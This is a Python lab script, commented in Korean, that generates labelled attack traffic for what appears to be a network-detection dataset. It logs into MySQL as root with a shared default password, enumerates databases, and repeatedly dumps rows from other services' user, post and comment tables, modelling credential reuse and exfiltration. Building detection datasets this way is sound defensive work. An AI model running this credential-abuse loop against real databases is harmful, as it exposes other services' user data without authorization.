#!/usr/bin/env python3
# attack_db.py — DB(MySQL) 공격 트래픽 (D1: 공유 root 크리덴셜 cross-DB 접근)
#
# ★ locust 아님. MySQL 은 비-HTTP(바이너리 프로토콜)이라 HTTP 부하생성기로 만들 수 없음(attack.md §5).
#
# 시나리오(CLAUDE.md §9): 세 서비스가 동일 root 크리덴셜로 MySQL 을 공유 → 한 서비스가
# 침해되면 그 크리덴셜로 '다른 서비스 DB'(auth_db/posts_db/comments_db)를 열람/덤프 (T1078/T1555).
# 이 스크립트는 root 로 접속해 cross-DB SELECT 를 반복 수행하며 악성 DB 트래픽을 생성한다.
#
# 사용:
#   pip install pymysql
#   MYSQL_ROOT_PASSWORD=rootpassword python attacks/attack_db.py --duration 120
#
# 캡처(별도 터미널, 동시):
#   bash capture_docker.sh deepmesh-mysql 120 ./pcap/attacks/mysql
#
# 라벨: 캡처 시간창 전체 malicious.

import argparse
import os
import time
import random

try:
    import pymysql
except ImportError:
    raise SystemExit("pymysql 필요: pip install pymysql")

HOST = os.environ.get("MYSQL_HOST", "127.0.0.1")
PORT = int(os.environ.get("MYSQL_PORT", "3306"))
USER = os.environ.get("MYSQL_USER", "root")
PASSWORD = os.environ.get("MYSQL_ROOT_PASSWORD", "rootpassword")

# cross-DB 열람 대상(서비스별 DB/테이블 — 침해 서비스가 아닌 '남의' DB)
TARGETS = [
    ("auth_db", "users"),
    ("posts_db", "posts"),
    ("comments_db", "comments"),
]


def run(duration: int):
    conn = pymysql.connect(host=HOST, port=PORT, user=USER, password=PASSWORD,
                           connect_timeout=10, autocommit=True)
    print(f"[attack_db] connected {USER}@{HOST}:{PORT} (root cross-DB access)")
    end = time.time() + duration
    n = 0
    with conn.cursor() as cur:
        while time.time() < end:
            # 정찰: 전체 DB/테이블 열거
            cur.execute("SHOW DATABASES")
            cur.fetchall()
            db, tbl = random.choice(TARGETS)
            try:
                cur.execute(f"SELECT COUNT(*) FROM {db}.{tbl}")
                cur.fetchall()
                # 대량 인출(exfiltration)
                cur.execute(f"SELECT * FROM {db}.{tbl} LIMIT 500")
                cur.fetchall()
                cur.execute(f"SHOW COLUMNS FROM {db}.{tbl}")
                cur.fetchall()
            except pymysql.err.Error as e:
                print(f"  [warn] {db}.{tbl}: {e}")
            n += 1
            time.sleep(random.uniform(0.05, 0.2))
    conn.close()
    print(f"[attack_db] done — {n} cross-DB query rounds in {duration}s")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="MySQL cross-DB 크리덴셜 악용 트래픽 생성(D1)")
    ap.add_argument("--duration", type=int, default=120, help="지속 시간(초)")
    run(ap.parse_args().duration)
